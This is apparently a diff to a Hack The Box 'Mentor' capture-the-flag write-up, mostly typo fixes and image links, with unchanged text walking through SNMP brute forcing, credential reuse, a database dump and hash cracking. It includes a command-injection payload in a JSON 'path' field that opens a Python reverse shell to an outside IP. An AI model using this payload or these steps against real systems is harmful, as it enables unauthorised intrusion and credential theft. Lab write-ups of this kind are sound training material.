@@ -59,17 +59,17 @@ ID           Response   Lines    Word       Chars       Payload
 000000051:   404        0 L      2 W        22 Ch       "api"
 ```
 
-However there's nothing really of interest there:
+However there's nothing really of initial interest there:
 
-mentor_api.png
+![mentor_api.png](../assets/mentor_assets/mentor_api.png)
 
 This is likely fastapi, so lets access the `/docs` directory:
 
-mentor_docs
+![mentor_docs.png](../assets/mentor_assets/mentor_docs.png)
 
 We can also kick off directory scanning for api.mentorquotes and find an `/admin` directory:
 
-mentor_dirs.png
+![mentor_dirs.png](../assets/mentor_assets/mentor_dirs.png)
 
 Not finding much of interest emuerating the API I decide to investigate UDP and see if SNMP is open:
 
@@ -106,7 +106,7 @@ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
 
 hmm, that didn't return much. we found the admin username, but nothing else of interest. 
 
-Lets try enumerating the community strings with aother tool. I'll use smbbrute.py: https://github.com/SECFORCE/SNMP-Brute
+Lets try enumerating the community strings with another tool. I'll use snmpbrute.py: https://github.com/SECFORCE/SNMP-Brute
 
 ```
 ┌──(ryan㉿kali)-[~/HTB/Mentor]
@@ -142,39 +142,47 @@ Cool, snmpbrute found another community string: internal. Weird the onesixtyone 
 
 Inspecting this using snmpwalk we find a potential password:
 
+![mentor_pass.png](../assets/mentor_assets/mentor_pass.png)
+
 ```
 kj23sadkj123as0-d213
 ```
 
 Now that we have these credentials, lets try logging in using swagger at `/auth/login`
 
-mentor_auth.png
+![mentor_auth.png](../assets/mentor_assets/mentor_auth.png)
 
 We were successful and a JWT token is issued:
 
-mentor_jwt.png
+![mentor_jwt.png](../assets/mentor_assets/mentor_jwt.png)
 
 Lets make that request again and capture it in burp:
 
-mentor_burp1.png
+![mentor_burp1.png](../assets/mentor_assets/mentor_burp1.png)
 
 ### Exploitation
 
 We can change the request type to GET and access the `/users` contents:
 
-mentor_users.png
+![mentor_users.png](../assets/mentor_assets/mentor_users.png)
 
 Recalling there was an `/admin/backup` page discovered with Feroxbuster, I try to access the page:
 
-mentor_nope.png
+![mentor_nope.png](../assets/mentor_assets/mentor_nope.png)
 
 Changing the request type back to POST we get a new error:
 
-mentor_burp3.png
+![mentor_burp3.png](../assets/mentor_assets/mentor_burp3.png)
+
+Trying again we see we are missing "path"
+
+![mentor_burp4.png](../assets/mentor_assets/mentor_burp4.png)
 
 If I update the content-type to application/json and test out just using the "path" we get the message "Done!"
 
-Updating the path to:
+![mentor_burp5](../assets/mentor_assets/mentor_burp5.png)
+
+Fiddling with possible injections for a long time and finally updating the path to:
 
 ```
 {"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.114\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}
@@ -194,7 +202,7 @@ whoami
 root
 ```
 
-RUnning `ls -la` I see we are likely in a docker container, which explains us being root:
+Running `ls -la` I see we are likely in a docker container, which explains us being root:
 
 ```
 /app # ls -la
@@ -210,13 +218,13 @@ drwxr-xr-x    1 root     root          4096 Nov 10  2022 app
 
 We can grab the user.txt flag from here:
 
-mentor_user_flag.png
+![mentor_user_flag.png](../assets/mentor_assets/mentor_user_flag.png)
 
 ### Privilege Escalation
 
 Browsing around the box I find a db.py file, which contains creds for an Postgres instance running internally:
 
-mentor_db_creds.png
+![mentor_db_creds.png](../assets/mentor_assets/mentor_db_creds.png)
 
 Lets transfer over chisel so we can access this:
 
@@ -283,7 +291,7 @@ mentorquotes_db=# select * from users;
 
 Dumping these into crackstation we successfully crack the service account hash:
 
-mentor_crack.png
+![mentor_crack.png](../assets/mentor_assets/mentor_crack.png)
 
 With this password I can now SSH in as svc:
 
@@ -295,6 +303,8 @@ Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
 ```
 
 Loading linPEAS onto the box, we find some snmp configuration files.
+
+![mentor_conf.png](../assets/mentor_assets/mentor_conf.png)
 
 Lets check that out.
 
@@ -351,7 +361,7 @@ mentor
 
 We can now grab the final flag:
 
-mentor_root_flag.png
+![mentor_root_flag.png](../assets/mentor_assets/mentor_root_flag.png)
 
 Thanks for following along!
 
